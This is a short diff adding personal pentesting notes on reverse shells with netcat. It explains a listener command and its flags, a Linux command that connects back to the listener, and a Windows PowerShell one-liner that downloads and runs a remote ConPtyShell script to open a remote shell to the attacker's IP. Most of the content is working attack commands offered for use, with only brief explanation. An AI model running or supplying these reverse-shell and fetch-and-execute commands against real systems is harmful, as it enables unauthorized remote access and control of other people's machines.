@@ -1,0 +1,34 @@
+- Uses the command 
+	EG.
+		nc
+
+- Used for connections where the machines are on the same network.
+
+
+					WORKING
+					========
+- When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us. To do this we need to create a listener to listen for a connection to our machine on a certain port that we are going to specify.
+	EG.
+		nc -lnvp 87  -->  nc -lnvp <port number>
+
+			-l :- Listen mode for inbound connects.
+
+			-n :- Numeric-only ip addresses, no dns.
+
+			-v :- verbose. will give us all the info. 
+
+			-p :- local port number.
+
+*ON LINUX MACHINE.
+	- On the attacked device we create a nc connection by providing the ip of the listenning machine followed by the port we are listenning to
+ 		EG.
+ 			nc 192.168.0.1 87 --> nc <ip of the listening machine> <port the listenning machine is listening to>
+
+
+*ON WINDOWS MACHINE
+	EG.
+		IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.1 87
+
+					FOR MORE INFO
+					==============
+https://swisskyrepo.github.io/PayloadsAllTheThings/#documentation
